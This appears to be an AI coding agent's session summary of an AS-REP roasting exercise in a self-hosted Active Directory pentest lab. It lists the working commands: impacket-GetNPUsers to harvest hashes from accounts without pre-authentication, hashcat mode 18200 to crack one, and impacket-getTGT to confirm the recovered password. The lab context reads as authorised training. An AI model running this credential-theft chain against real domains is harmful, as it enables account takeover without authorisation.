thread_id: 019068f9-6d4c-702c-89b1-6bd88bd8c9cb
updated_at: 2026-05-18T16:59:19+00:00
rollout_path: C:\Users\<USER>\.codex\sessions\2026\05\19\rollout-2026-05-19T00-24-19-019068f9-6d4c-702c-89b1-6bd88bd8c9cb.jsonl
cwd: \\?\C:\Workspace\pentest-lab

# AS-REP-roasted accounts with `DONT_REQ_PREAUTH` in the self-hosted AD lab, cracked one hash with hashcat.

Rollout context: cwd was `C:\Workspace\pentest-lab`, Windows + Kali VM against the self-hosted AD lab. Exercise focused on AS-REP roasting alongside the Kerberoasting exercise from the same series.

## Task 1: Enumerate DONT_REQ_PREAUTH accounts → AS-REP → hashcat

Outcome: success

Preference signals:
- The user wanted the entire pipeline as one script (`asrep.sh`) that could be re-run after snapshot reset.
- Chinese narration; commands in English.

Key steps:
- Ran `impacket-GetNPUsers lab.local/ -no-pass -usersfile users.txt -dc-ip <dc> -format hashcat` → captured one AS-REP hash for the intentionally weak `svc_backup` account.
- `hashcat -m 18200 -a 0 hash rockyou.txt -r rules/best64.rule` → cracked in ~4 minutes on the local GPU.
- Verified with `impacket-getTGT lab.local/svc_backup:<cracked_pw>` → TGT accepted.

Failures and how to do differently:
- Enumeration initially used a stale user list; the target account had been renamed. Regenerated `users.txt` from the DC via a low-priv account's `net user /domain`.

Reusable knowledge:
- AS-REP roasting hashcat mode = `-m 18200`. Same wordlist + rules as Kerberoasting works.
- If the DONT_REQ_PREAUTH flag is set on a well-picked service account, this is a zero-authentication attack — no credentials required at request time.

References:
- [1] Script: `asrep.sh`
- [2] hashcat: 6.2.6
- [3] Lab DC: `dc.lab.local`
